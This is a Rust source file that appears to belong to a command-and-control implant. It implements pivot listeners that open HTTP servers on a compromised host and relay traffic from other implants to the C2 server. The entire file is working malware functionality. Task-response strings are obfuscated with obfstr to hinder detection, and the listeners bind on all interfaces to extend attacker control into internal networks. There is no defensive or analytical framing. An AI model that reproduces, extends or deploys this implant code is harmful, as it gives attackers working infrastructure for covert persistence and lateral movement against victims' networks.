use std::{
    collections::HashMap,
    io::{Read, Write},
    net::TcpStream,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex,
    },
    thread::{self, JoinHandle},
    time::Duration,
};
use lazy_static::lazy_static;
use obfstr::obfstr;
use serde_json::Value;

lazy_static! {
    static ref LISTENERS: Mutex<HashMap<u16, (JoinHandle<()>, Arc<AtomicBool>)>> =
        Mutex::new(HashMap::new());
}

/// Unblock `tiny_http::Server::incoming_requests()`, which only yields after a
/// full HTTP request is parsed. A bare TCP connect is not enough and used to
/// leave `stop_pivot` stuck forever on `join()`.
fn poke_http_listener(port: u16) {
    let Ok(mut stream) = TcpStream::connect(("127.0.0.1", port)) else {
        return;
    };
    let _ = stream.set_write_timeout(Some(Duration::from_secs(2)));
    let _ = stream.set_read_timeout(Some(Duration::from_secs(2)));
    let req = format!(
        "POST / HTTP/1.0\r\nHost: 127.0.0.1:{port}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
    );
    let _ = stream.write_all(req.as_bytes());
    let mut buf = [0u8; 256];
    let _ = stream.read(&mut buf);
}

fn parse_port_arg(task: &Value) -> Result<u16, Box<dyn std::error::Error>> {
    let raw_params = task
        .get("parameters")
        .ok_or("missing parameters")?
        .as_str()
        .ok_or("parameters is not a string")?;
    let params: Value = serde_json::from_str(raw_params)?;
    let port = params
        .get("arg1")
        .and_then(Value::as_str)
        .ok_or("missing arg1")?
        .parse::<u16>()?;
    Ok(port)
}

fn post_task_result(
    task: &Value,
    user_output: String,
) -> Result<(), Box<dyn std::error::Error>> {
    let response_json = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [
            {
                obfstr!("task_id"): task.get("id").unwrap().as_str().unwrap(),
                obfstr!("user_output"): user_output,
                obfstr!("timestamp"): task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap(),
                obfstr!("status"): obfstr!("success"),
                obfstr!("completed"): true,
            }
        ]
    });
    crate::transport::send_request(&serde_json::to_string(&response_json)?)?;
    Ok(())
}

pub fn startPivotListener(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let port = parse_port_arg(task)?;

    let mut map = LISTENERS.lock().unwrap();
    if map.contains_key(&port) {
        return Err("listener already running on this port".into());
    }

    // Bind before recording the listener so bind failure does not leave a
    // half-started entry, and so we can return a real task error.
    let server = tiny_http::Server::http(("0.0.0.0", port)).map_err(|e| {
        format!("failed to bind pivot listener on port {port}: {e}")
    })?;

    crate::helpers::churn(&port.to_ne_bytes());

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    let handle = thread::spawn(move || {
        for mut request in server.incoming_requests() {
            if !r.load(Ordering::SeqCst) {
                // Shutdown poke (or any request after stop): drop without
                // proxying so the accept loop can exit.
                break;
            }

            thread::spawn(move || {
                let mut body = String::new();
                if request.as_reader().read_to_string(&mut body).is_ok() {
                    // Forward the raw C2 body and return the raw response text.
                    // Re-serializing via serde_json::Value would alter formatting
                    // and break non-JSON edge cases.
                    match crate::transport::send_request_raw(&body) {
                        Ok(res) => {
                            let _ = request.respond(
                                tiny_http::Response::from_string(res).with_status_code(200),
                            );
                        }
                        Err(_) => {
                            let _ = request.respond(
                                tiny_http::Response::from_string("proxy error")
                                    .with_status_code(500),
                            );
                        }
                    }
                } else {
                    let _ = request.respond(
                        tiny_http::Response::from_string("bad request").with_status_code(400),
                    );
                }
            });
        }
    });

    map.insert(port, (handle, running));
    post_task_result(task, format!("Pivot listener started on port {port}"))
}

pub fn stopPivotListener(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let port = parse_port_arg(task)?;

    let mut map = LISTENERS.lock().unwrap();
    if let Some((handle, flag)) = map.remove(&port) {
        flag.store(false, Ordering::SeqCst);
        // Drop the map lock before poking/joining so the accept loop (and any
        // concurrent list_pivot) is not blocked on the mutex.
        drop(map);
        poke_http_listener(port);
        let _ = handle.join();
    } else {
        return Err("no listener on specified port".into());
    }

    post_task_result(task, format!("Pivot listener stopped on port {port}"))
}

pub fn listPivotListeners(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let ports: Vec<u16> = {
        let map = LISTENERS.lock().unwrap();
        map.keys().cloned().collect()
    };

    let port_list = if ports.is_empty() {
        "No active pivot listeners.".to_string()
    } else {
        format!(
            "Active pivot listener ports: {}",
            ports
                .iter()
                .map(u16::to_string)
                .collect::<Vec<_>>()
                .join(", ")
        )
    };

    post_task_result(task, port_list)
}
